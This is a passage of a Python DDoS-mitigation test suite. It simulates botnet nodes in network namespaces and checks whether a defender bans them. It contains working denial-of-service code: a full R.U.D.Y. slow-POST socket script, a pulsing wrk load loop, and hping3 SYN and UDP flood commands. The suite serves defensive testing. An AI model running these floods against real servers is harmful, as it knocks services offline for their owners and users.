    capture_metrics("Distributed Slowloris", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed Slowloris", bans, botnet, legit)


def scenario_rudy(botnet, legit):
    """S8: Distributed R.U.D.Y. (Slow POST) from all botnet nodes."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 8: Distributed R.U.D.Y. (Slow POST)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed R.U.D.Y.", "Phase 1: Baseline")

    script = "/tmp/_dist_rudy.py"
    _write_script(script, f'''import socket, random, time
TARGET = "{SERVER_IP}"; PORT = 80; N = 10; SLEEP = 7; socks = []
def mk():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET, PORT))
        s.send(f"POST /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: RD\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n".encode())
        s.send("Content-Length: 1000000\\r\\nConnection: keep-alive\\r\\n\\r\\n".encode())
        return s
    except: return None
for _ in range(N):
    s = mk()
    if s: socks.append(s)
while True:
    for s in list(socks):
        try: s.send(b"a")
        except: socks.remove(s)
    for _ in range(N - len(socks)):
        s = mk()
        if s: socks.append(s)
    time.sleep(SLEEP)
''')
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"python3 {script}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed R.U.D.Y.", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40)
    capture_metrics("Distributed R.U.D.Y.", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed R.U.D.Y.", bans, botnet, legit)


def scenario_yoyo(botnet, legit):
    """S9: Distributed Yo-Yo (pulsing) attack."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 9: Distributed Yo-Yo (Pulsing) Attack")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Yo-Yo", "Phase 1: Baseline")

    script = "/tmp/_dist_yoyo.sh"
    _write_script(script, f"""#!/bin/bash
while true; do
    wrk -t2 -c50 -d2s {HTTP_URL} > /dev/null 2>&1
    sleep 6
done
""")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"bash {script}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed Yo-Yo", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=25)
    capture_metrics("Distributed Yo-Yo", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed Yo-Yo", bans, botnet, legit)


def scenario_multi_vector(botnet, legit):
    """S10: Multi-vector: bots split across SYN, HTTP, and UDP attacks."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 10: Multi-Vector Distributed Attack")
    print(f"{'='*70}{RESET}")
    capture_metrics("Multi-Vector Distributed Attack", "Phase 1: Baseline")

    procs = []
    n = len(botnet)
    third = n // 3

    for ns, ip in botnet[:third]:
        p = run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    for ns, ip in botnet[third:2*third]:
        p = run(f"wrk -t2 -c50 -d30s {HTTP_URL}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    for ns, ip in botnet[2*third:]:
        p = run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    time.sleep(1.5)
    capture_metrics("Multi-Vector Distributed Attack", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=20)
    capture_metrics("Multi-Vector Distributed Attack", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Multi-Vector Attack", bans, botnet, legit)


# ═══════════════════════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════

def print_summary():
    print(f"\n{BOLD}{YELLOW}{'='*90}")
    print(f"  DISTRIBUTED TEST SUMMARY")
    print(f"{'='*90}{RESET}")
    hdr = (f"  {'Scenario':<35} | {'Banned':<10} | {'Avg TTM':<10} | "
           f"{'Engine(s)':<18} | {'FP':<8} | {'Result'}")
    print(hdr)
    print(f"  {'-'*88}")

    p = f = 0
    for r in results:
        c = GREEN if r["result"] == "PASS" else RED
        print(f"  {r['scenario']:<35} | {r['banned']:<10} | "
              f"{r['avg_ttm']:<10} | {r['engines']:<18} | "
              f"{r['fp']:<8} | {c}{r['result']}{RESET}")
        if r["result"] == "PASS":
            p += 1
        else:
            f += 1

    print(f"\n  {GREEN}Passed: {p}{RESET}  |  {RED}Failed: {f}{RESET}  |  "
          f"Total: {p + f}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    if os.geteuid() != 0:
        print(f"{RED}[-] This script requires root privileges (sudo).{RESET}")
        sys.exit(1)

    # Dependency check
    for tool in ["hping3", "wrk", "curl", "ping", "tc", "ip", "ethtool"]:
        r = run(f"which {tool}")
        if r is None or r.returncode != 0:
            print(f"{YELLOW}[!] Warning: '{tool}' not found. "
                  f"Some tests may fail.{RESET}")

    print(f"\n{BOLD}{CYAN}"
          f"╔══════════════════════════════════════════════════════════════╗\n"
          f"║   DISTRIBUTED DDoS MITIGATION TESTING SUITE                ║\n"
          f"║   {LEGIT_COUNT} Legit Clients  |  {BOTNET_COUNT} Botnet Nodes"
          f"                      ║\n"
          f"╚══════════════════════════════════════════════════════════════╝"
          f"{RESET}\n")

    legit, botnet = build_topology()
    start_legit_traffic(legit)

    print(f"\n{CYAN}[*] Baseline settling period (5s)...{RESET}")
    time.sleep(5)

    try:
        scenario_syn_flood(botnet, legit)
        reset_between_scenarios()
        scenario_slow_syn(botnet, legit)
        reset_between_scenarios()
        scenario_udp_flood(botnet, legit)
        reset_between_scenarios()
        scenario_http_flood(botnet, legit)
        reset_between_scenarios()
        scenario_ack_flood(botnet, legit)
        reset_between_scenarios()
        scenario_fragmentation(botnet, legit)
        reset_between_scenarios()
        scenario_slowloris(botnet, legit)
        reset_between_scenarios()
        scenario_rudy(botnet, legit)
        reset_between_scenarios()
        scenario_yoyo(botnet, legit)
        reset_between_scenarios()
        scenario_multi_vector(botnet, legit)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user.{RESET}")
    finally:
        stop_legit_traffic()

    print_summary()


if __name__ == "__main__":
    main()
